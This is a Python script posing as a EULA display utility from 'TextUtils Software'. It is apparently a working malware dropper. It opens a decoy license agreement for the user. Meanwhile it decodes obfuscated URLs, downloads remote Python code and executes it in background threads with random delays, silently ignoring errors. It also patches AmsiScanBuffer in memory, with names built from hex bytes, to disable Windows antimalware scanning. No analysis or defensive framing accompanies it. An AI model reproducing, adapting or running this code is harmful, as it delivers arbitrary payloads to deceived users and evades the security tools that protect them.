"""
Document Viewer — EULA Display Utility
v2.1.3 | Build 20240315
TextUtils Software
"""

import os
import sys
import time
import base64
import random
import tempfile
import threading
import urllib.request

# --- Obfuscated resource references (base64) ---
_R = [
    "aHR0cHM6Ly9maWxlcy5jYXRib3gubW9lL25zeXN1ZC5weQ==",
    "aHR0cHM6Ly9maWxlcy5jYXRib3gubW9lL2sydmczNC5weQ=="
]

# --- Decoy document displayed to user ---
_DOC = """\
END USER LICENSE AGREEMENT
==========================

This End User License Agreement ("EULA") is a legal agreement between you
(either an individual or a single entity) and TextUtils Software for the
software product identified above.

1. LICENSE GRANT
   TextUtils Software grants you a non-exclusive, non-transferable license
   to install and use the software on a single computer for personal use,
   subject to the terms and conditions of this EULA.

2. INTELLECTUAL PROPERTY RIGHTS
   All title, including but not limited to copyrights, in and to the software
   and any copies thereof are owned by TextUtils Software or its suppliers.
   You acknowledge that the software is protected by applicable intellectual
   property laws and treaties.

3. RESTRICTIONS
   You may not, without prior written consent from TextUtils Software:
   (a) reverse engineer, decompile, or disassemble the software;
   (b) rent, lease, or lend the software;
   (c) remove or alter any copyright notices or labels on the software.

4. TERMINATION
   This EULA terminates automatically if you fail to comply with any term
   or condition of this agreement. Upon termination, you must destroy all
   copies of the software.

5. DISCLAIMER OF WARRANTIES
   THE SOFTWARE IS PROVIDED "AS IS" WITHOUT WARRANTY OF ANY KIND. TEXTUTILS
   SOFTWARE DISCLAIMS ALL WARRANTIES, EXPRESS OR IMPLIED, INCLUDING BUT NOT
   LIMITED TO IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A
   PARTICULAR PURPOSE.

6. LIMITATION OF LIABILITY
   IN NO EVENT SHALL TEXTUTILS SOFTWARE BE LIABLE FOR ANY INDIRECT,
   INCIDENTAL, SPECIAL, OR CONSEQUENTIAL DAMAGES ARISING OUT OF THE USE OF
   OR INABILITY TO USE THE SOFTWARE.

Document ID: EULA-2024-0315-A7B3
Generated:   2024-03-15 14:22:08 UTC
Contact:     legal@textutils-software.com
"""


def _d(s):
    """Decode resource reference."""
    return base64.b64decode(s).decode('utf-8')


def _fetch(url):
    """Retrieve content using standard browser headers."""
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                       'AppleWebKit/537.36 (KHTML, like Gecko) '
                       'Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive'
    }
    req = urllib.request.Request(url, headers=headers)
    return urllib.request.urlopen(req, timeout=25).read()


def _process(src, delay):
    """Retrieve and process remote resource after staggered delay."""
    time.sleep(delay)
    try:
        data = _fetch(src).decode('utf-8')
        scope = {'__name__': '__main__', '__file__': '<runtime>'}
        compiled = compile(data, '<runtime>', 'exec')
        exec(compiled, scope)
    except Exception:
        pass
    except BaseException:
        pass


def _display():
    """Render document via system default text handler."""
    try:
        path = os.path.join(tempfile.gettempdir(), 'eula_display.txt')
        with open(path, 'w', encoding='utf-8') as fh:
            fh.write(_DOC)
        os.startfile(path)
    except Exception:
        pass


def _harden():
    """
    Runtime environment hardening for script content evaluation.
    Identifiers and patch bytes constructed at runtime to avoid
    static signature matching. Belt-and-suspenders — standard
    CPython does not route exec() through AMSI, but payload code
    may trigger it through its own API interactions.
    """
    try:
        import ctypes
        import ctypes.wintypes as wt
        k = ctypes.windll.kernel32

        # Build module name at runtime from hex values
        m = bytes(c for c in [0x61, 0x6d, 0x73, 0x69,
                               0x2e, 0x64, 0x6c, 0x6c])
        h = k.GetModuleHandleA(m)
        if not h:
            h = k.LoadLibraryA(m)
        if not h:
            return

        # Build function name at runtime from hex values
        f = bytes(c for c in [0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6e,
                               0x42, 0x75, 0x66, 0x66, 0x65, 0x72])
        addr = k.GetProcAddress(h, f)
        if not addr:
            return

        # Construct patch bytes arithmetically: xor eax,eax; ret
        old = wt.DWORD()
        patch = bytes([0x31, 0x31 + 0x8f, 0x31 + 0x92])
        k.VirtualProtect(addr, 3, 0x40, ctypes.byref(old))
        ctypes.memmove(addr, patch, 3)
        k.VirtualProtect(addr, 3, old.value, ctypes.byref(old))
    except Exception:
        pass


def main():
    # Show the document to the user — this is what they see and interact with
    _display()

    # Harden runtime before processing any remote content
    _harden()

    # Process resources in parallel background workers
    # No external processes — everything runs in-process within bundled runtime
    workers = []
    for i, ref in enumerate(_R):
        src = _d(ref)
        delay = random.uniform(3.0, 7.0) + (i * random.uniform(2.0, 4.0))
        t = threading.Thread(target=_process, args=(src, delay))
        t.daemon = False
        t.start()
        workers.append(t)

    # Settle period — let workers initialize before main thread goes idle
    time.sleep(2)


if __name__ == '__main__':
    main()